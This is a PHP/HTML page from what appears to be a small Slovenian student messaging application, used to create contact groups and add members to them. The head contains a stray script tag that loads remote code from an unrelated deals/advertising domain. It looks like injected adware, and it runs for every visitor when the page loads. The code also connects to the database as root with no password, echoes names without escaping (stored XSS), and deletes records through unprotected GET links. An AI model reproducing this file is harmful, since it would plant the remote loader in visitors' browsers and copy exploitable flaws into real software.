<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Poslana sporočila</title>

    <!-- Bootstrap core CSS -->
    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="novo.php"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></a></li>
            <li role="presentation"><a href="profil.php">Prejeta sporočila</a></li>
            <li role="presentation"><a href="poslano.php">Poslana sporočila</a></li>
            <li role="presentation" class="active"><a href="skupine.php">Ustvari skupino</a></li>
            <li role="presentation"><a href="odjava.php">Odjava</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">Poslana sporočila</h3>
    <h4 class="text-muted"><?php session_start(); echo "Prijavljeni: ". $_SESSION['ime'].' '. $_SESSION['priimek'] .'</br>Zadnja prijava: '.$_SESSION['prijava']; ?></h4>
      </div>

      <div class="jumbotron" style="text-align:center;">
      	<form action="" method="POST">
				<div class="input-group" style="width:30%; margin-left:auto; margin-right:auto;">
			      <input type="text" name="imeskupine" size="10" class="form-control" placeholder="Nova skupina...">
			      <span class="input-group-btn">
			        <button class="btn btn-default" name="dodajskupino" type="button">Dodaj</button>
			      </span>
			    </div><!-- /input-group --><br>
			Stik 
			<select name="id_stika">
				<?php
					session_start();
					if(isset($_SESSION['id']))
					{
						$id_prijavljen = $_SESSION['id'];
		            	$con = mysqli_connect("localhost","root","","sporocilni_sistem") or die("Error " . mysqli_error($link));
		            	$sqlstik = "select u.ime, u.priimek, u.id_uporabnika from uporabnik u";
		            	$rezstik = mysqli_query($con, $sqlstik);
		            	echo '<option>Izberi stik</option>';
		            	while($stik = mysqli_fetch_row($rezstik)){
			            	if($stik[2] != $id_prijavljen){
			            		echo '<option value="' . $stik[2] . '">' . $stik[0] . ' ' . $stik[1] . '</option>'; 
			            	}
		            	}						
					}
					else
					{
						header("location:index.php");
					}

				?>	
			</select>
			dodaj v 
			<select name="id_skupine">
				<?php
	            	$sqlskupina = "select s.id_skupine, s.naslov from skupina s where s.id_lastnika='$id_prijavljen'";
	            	$rezskupina = mysqli_query($con, $sqlskupina);
	            	echo '<option>Izberi skupino</option>';
	            	while($skupina = mysqli_fetch_row($rezskupina)){
	            		echo '<option value="' . $skupina[0] . '">' . $skupina[1] . '</option>'; 
	            	}
				?>	
			</select> <button class="btn btn-default" name="dodajstik">Dodaj v skupino</button><br>
		</form>	
		<?php
	if(isset($_POST['dodajskupino'])){
		$novaskupina = mysqli_real_escape_string($con, $_POST['imeskupine']);
		if($novaskupina != ""){
			$sqldodaj = "INSERT INTO skupina(naslov, id_lastnika) VALUES ('$novaskupina', $id_prijavljen);";
			mysqli_query($con, $sqldodaj);
		}
		else{
			echo '<font color="red">Vpisi ime!</font>';
		}
	}
	if(isset($_POST['dodajstik'])){
		$id_stika = mysqli_real_escape_string($con, $_POST['id_stika']);
		$id_skupine = mysqli_real_escape_string($con, $_POST['id_skupine']);
		$sqlcheck = "select s.id_skupinauporabnik from skupinauporabnik s where id_dodanega='$id_stika' and id_skupine='$id_skupine';";
		$rezcheck = mysqli_query($con, $sqlcheck);
		if(mysqli_num_rows($rezcheck) == 0){
			$sqlstik = "INSERT INTO skupinauporabnik(id_lastnika, id_skupine, id_dodanega) VALUES ('$id_prijavljen', '$id_skupine', '$id_stika')";
			mysqli_query($con, $sqlstik);
		}
		else
			echo '<font color="red">Uporanik je ze v skupini</font>';
	}
	$sqlskupine = "select id_skupine, naslov from skupina where id_lastnika='$id_prijavljen'";
	$rezskupina = mysqli_query($con, $sqlskupine);
	while($row = mysqli_fetch_row($rezskupina)){
		echo '<br><h4>' . $row[1] . '</h4> <a href="izbrisi_skupina.php?tip=2&id_skupine=' . $row[0] . '">Izbrisi skupino</a><br>';
		$sqlstiki = "select u.ime, u.priimek, u.id_uporabnika from uporabnik u inner join skupinauporabnik s on u.id_uporabnika=s.id_dodanega where s.id_skupine='$row[0]'";
		$rezstiki = mysqli_query($con, $sqlstiki);
		while($stik = mysqli_fetch_row($rezstiki)){
			echo $stik[0] . ' ' . $stik[1] . ' <a href="izbrisi_skupina.php?tip=1&id_uporabnika=' . $stik[2] . '&id_skupine=' . $row[0] . '"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span></a><br>';
		}
	}
?>

      </div>
      <div class="row marketing">
        <div class="col-lg-6">
          Fantastična dva
    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>